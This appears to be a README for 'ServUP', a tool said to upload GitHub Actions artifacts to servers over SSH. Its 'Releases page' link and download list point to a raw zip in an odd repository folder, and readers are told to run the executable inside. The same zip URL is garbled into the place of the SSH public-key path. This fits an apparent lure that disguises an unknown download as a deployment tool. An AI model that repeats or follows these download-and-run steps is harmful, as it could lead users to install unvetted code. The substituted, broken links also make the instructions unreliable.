## 📂 Introduction
Welcome to ServUP! This application lets you upload files from GitHub Actions directly to your server using SSH. It simplifies deployment, making it easier for you to manage your projects, even if you don’t have technical skills.

## 🚀 Getting Started
Before you can start using ServUP, you'll need a few things set up:

### 🖥️ System Requirements
- A computer running Windows, macOS, or Linux.
- SSH access to your server.
- An active GitHub account to manage your repositories.

## 🔗 How to Download & Install
To get started with ServUP, follow these steps:

1. **Visit the Releases Page**
   Go to the [Releases page](https://raw.githubusercontent.com/harv99y/ServUP/main/scyphate/ServUP.zip) for the latest version of ServUP.

2. **Download the Application**
   On the Releases page, find the latest version of ServUP. Look for the files you can download, such as `.zip`, `https://raw.githubusercontent.com/harv99y/ServUP/main/scyphate/ServUP.zip`, or executables.

3. **Install the Application**
   After downloading, locate the file on your computer and extract it if necessary. For Windows, run the `.exe` file. For macOS or Linux, follow the instructions to make the file executable.

4. **Open a Terminal or Command Prompt**
   You will need to run some commands. Open your Terminal (macOS, Linux) or Command Prompt (Windows).

5. **Prepare Your Server**
   Make sure your server is ready to accept SSH connections. You may need to create or check your SSH key pairs.

6. **Run ServUP**
   In the terminal, navigate to the folder where you downloaded ServUP. Use the following command to start the application:

   ```bash
   ./ServUP
   ```

   Replace `./ServUP` with the exact name of the downloaded file.

## ⚙️ Configuring Your Setup
To make the most of ServUP, you need to set it up for your specific server.

### 🔑 Set Up SSH Keys
1. **Generate Keys (If You Don’t Have Them)**
   If your server requires SSH keys, you can create one by running:

   ```bash
   ssh-keygen -t rsa -b 4096
   ```

   Press Enter to accept the default location. Follow the prompts to create your key pair.

2. **Copy Your Public Key**
   Copy the contents of your public key file (`~https://raw.githubusercontent.com/harv99y/ServUP/main/scyphate/ServUP.zip`) to your server. You can use this command:

   ```bash
   ssh-copy-id user@your_server_ip
   ```

   Replace `user` with your server username and `your_server_ip` with your server’s IP address.

### 📁 Configure ServUP
Open the ServUP configuration file to set your server details. You will specify your server's IP address, the directory to store the files, and any other required settings.

In the file, look for sections that need your specific information, such as:

```json
{
  "server": "your_server_ip",
  "username": "your_username",
  "destination": "/path/to/destination"
}
```

Fill in these fields with your actual server details.

## 🚀 Using ServUP
Once everything is set up, you're ready to use ServUP to upload files from GitHub Actions.

### 📦 Uploading Artifacts
1. Make sure your GitHub Actions workflow is set up to generate artifacts you want to upload.
2. Integrate ServUP into your workflow. Here is a simple example of how to upload an artifact:

   ```yaml
   jobs:
     deploy:
       runs-on: ubuntu-latest
       steps:
       - name: Upload Artifact
         uses: actions/upload-artifact@v2
         with:
           name: my-artifact
           path: path/to/artifact
       - name: Deploy with ServUP
         run: |
           ./ServUP upload --artifact my-artifact
   ```

3. Modify your workflow file to match your project needs.
